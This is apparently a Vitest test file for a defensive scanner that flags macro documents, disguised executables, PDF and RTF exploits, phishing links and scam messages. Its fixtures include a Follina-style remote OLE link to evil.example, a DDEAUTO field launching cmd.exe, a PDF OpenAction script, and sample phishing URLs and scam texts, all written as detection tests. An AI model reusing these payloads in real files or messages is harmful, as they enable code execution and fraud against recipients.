import { describe, expect, it } from 'vitest';
import JSZip from 'jszip';
import { scanFile } from './scan';
import { checkLink, linksIn } from './links';
import { checkText } from './scam';
import { disinfect } from './vaccine';

const docx = async (extra: (z: JSZip) => void) => {
  const z = new JSZip();
  z.file('[Content_Types].xml', '<Types><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>');
  z.file('word/document.xml', '<w:document><w:body><w:p><w:r><w:t>Bonjour</w:t></w:r></w:p></w:body></w:document>');
  z.file('word/_rels/document.xml.rels', '<Relationships></Relationships>');
  extra(z);
  return z.generateAsync({ type: 'arraybuffer' });
};

describe('file scan', () => {
  it('a plain document is clean', async () => {
    expect((await scanFile('a.docx', await docx(() => {}))).level).toBe('ok');
  });
  it('finds macros and offers a clean copy that keeps the text', async () => {
    const buf = await docx(z => { z.file('word/vbaProject.bin', 'x'); z.file('word/_rels/document.xml.rels', '<Relationships><Relationship Id="r9" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'); });
    const v = await scanFile('facture.docm', buf);
    expect(v.findings.map(f => f.code)).toContain('macro');
    const clean = await disinfect('facture.docm', buf);
    expect(clean?.name).toBe('facture (sain).docx');
    const z = await JSZip.loadAsync(clean!.data);
    expect(z.file('word/vbaProject.bin')).toBeNull();
    expect(await z.file('word/document.xml')!.async('string')).toContain('Bonjour');
    expect(await z.file('[Content_Types].xml')!.async('string')).toContain('wordprocessingml.document.main+xml');
    expect((await scanFile(clean!.name, clean!.data)).level).toBe('ok');
  });
  it('catches the Follina remote object and DDE', async () => {
    const buf = await docx(z => {
      z.file('word/_rels/document.xml.rels', '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://evil.example/x.html!x-usc:http://evil.example/x.html" TargetMode="External"/></Relationships>');
      z.file('word/document.xml', '<w:document><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText></w:document>');
    });
    const codes = (await scanFile('a.docx', buf)).findings.map(f => f.code);
    expect(codes).toEqual(expect.arrayContaining(['remote', 'dde']));
  });
  it('sees a program pretending to be a document', async () => {
    const exe = new Uint8Array([0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0]).buffer;
    expect((await scanFile('facture.pdf', exe)).level).toBe('danger');
    expect((await scanFile('photo.jpg.exe', exe)).findings.map(f => f.code)).toContain('doubleExt');
  });
  it('finds PDF scripts and launch actions', async () => {
    const pdf = new TextEncoder().encode('%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> /Launch >> endobj').buffer;
    const codes = (await scanFile('a.pdf', pdf)).findings.map(f => f.code);
    expect(codes).toEqual(expect.arrayContaining(['pdfJs', 'pdfLaunch', 'pdfAuto']));
  });
  it('finds RTF objects', async () => {
    expect((await scanFile('a.rtf', new TextEncoder().encode('{\\rtf1{\\object\\objautlink\\objupdate{\\*\\objdata 0105}}}').buffer)).level).toBe('danger');
  });
});

describe('links', () => {
  it('known sites are fine', () => {
    for (const u of ['https://www.paypal.com/signin', 'https://accounts.google.com', 'https://fisbal.github.io/oi1/', 'https://www.desjardins.com']) expect(checkLink(u).level).toBe('ok');
  });
  it('catches brand tricks, look-alikes, @ tricks, code links and lying text', () => {
    expect(checkLink('https://paypal.com.secure-login.xyz/verify').level).toBe('danger');
    expect(checkLink('https://paypa1.com/login').level).toBe('danger');
    expect(checkLink('https://micros0ft-support.com').level).toBe('danger');
    expect(checkLink('https://www.google.com@evil.example/').level).toBe('danger');
    expect(checkLink('javascript:alert(1)').level).toBe('danger');
    expect(checkLink('https://evil.example/', 'www.desjardins.com').findings.map(f => f.code)).toContain('textMismatch');
    expect(checkLink('https://xn--pypal-4ve.com').level).not.toBe('ok');
  });
  it('finds links in a text', () => {
    expect(linksIn('Payez ici: https://bit.ly/abc, ou www.exemple.fr.')).toEqual(['https://bit.ly/abc', 'www.exemple.fr']);
  });
});

describe('scam text', () => {
  it('flags classic scams in several languages', () => {
    expect(checkText('URGENT: votre compte a été suspendu. Achetez des cartes cadeaux Google Play et envoyez-moi le code.').level).toBe('danger');
    expect(checkText('Please note our new bank details for the invoice. Keep this confidential, do not tell anyone.').level).toBe('danger');
    expect(checkText('Ihr Paket konnte nicht zugestellt werden. Zollgebühr von 1,99 € sofort zahlen.').level).not.toBe('ok');
  });
  it('leaves normal mail alone', () => {
    expect(checkText('Bonjour, voici le compte rendu de la réunion de mardi. Bonne journée.').level).toBe('ok');
    expect(checkText('Your parcel was delivered today.').level).toBe('ok');
  });
});
